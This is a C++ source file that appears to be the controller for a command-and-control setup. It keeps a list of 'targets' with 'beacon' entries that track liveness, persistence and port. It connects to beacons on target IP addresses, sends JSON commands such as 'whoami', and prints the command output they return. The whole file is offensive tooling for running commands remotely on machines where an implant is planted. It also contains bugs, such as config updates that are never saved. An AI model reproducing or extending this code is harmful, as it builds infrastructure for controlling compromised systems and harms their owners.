#include <iostream>
#include <string>
#include <tuple>
#include <sstream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cmds.hpp>
#include <nlohmann/json.hpp>
#define SUCCESS 100

using json = nlohmann::json;

std::tuple<int, std::string, int> get_beacon_data(sockaddr_in &sa, int &tid){
    json config = getConfig();
    if (!config["targets"][tid]["beacon"]["alive"]){
        return {-1, "", -1};
    }
    else {
        std::string ip_addr = config["targets"][tid]["ip"];
        return {0, ip_addr, config["targets"][tid]["beacon"]["port"]};
    }
}

void process(std::string reply, std::string ip, int port){
    json b_response;
    try {
        b_response = json::parse(reply);
    }
    catch (...) {
        std::cerr << "failed to parse json from beacon on " << ip << std::endl;
        return;
    }
    int id = b_response["id"];
    int status = b_response["status"];
    std::string cout = b_response["cout"];
    if (status != SUCCESS) {
        std::cerr << "error updating beacon on [" << ip << "]\n";
    }
    std::cout << "[b-" << port << "] " << cout << std::endl;
    json config = getConfig();
    config["targets"][id]["beacon"]["alive"] = b_response["alive"];
    config["targets"][id]["beacon"]["persistent"] = b_response["persistent"];
    config["targets"][id]["beacon"]["port"] = b_response["port"];
}

void communicate(int tid, std::string update) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0), valread, s_client_fd;

    if (sockfd < 0){
        std::cerr << "Error opening socket.\n";
        return;
    }
    sockaddr_in beacon_addr;
    beacon_addr.sin_family = AF_INET;
    auto [status, ip, port] = get_beacon_data(beacon_addr, tid);
    if (status < 0){
        std::cout << "a beacon may not be present on this target, or is unreachable\n";
        return;
    }
    beacon_addr.sin_addr.s_addr = inet_addr(ip.c_str());
    //beacon_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    beacon_addr.sin_port = htons(port);
    if ((s_client_fd = connect(sockfd, (struct sockaddr*)&beacon_addr, sizeof(beacon_addr))) < 0){
        std::cout << "Failed to connect to beacon on target " << tid << " [" << ip << "]\n";
        return;
    }
    send(sockfd, update.c_str(), strlen(update.c_str()), 0);
    char buf[1024]{0};
    valread = read(sockfd, buf, 1024);
    std::string reply = std::string{buf}.substr(0,valread);
    process(reply, ip, port);
    close(s_client_fd);
}

int main(){
    json j;
    std::string k;
    j["command"] = "whoami";
    j["name"] = "jim";
    j["age"] = json({});
    std::stringstream ss;
    ss << j;
    k = ss.str();
    std::cout << k;
    communicate(0, k);
}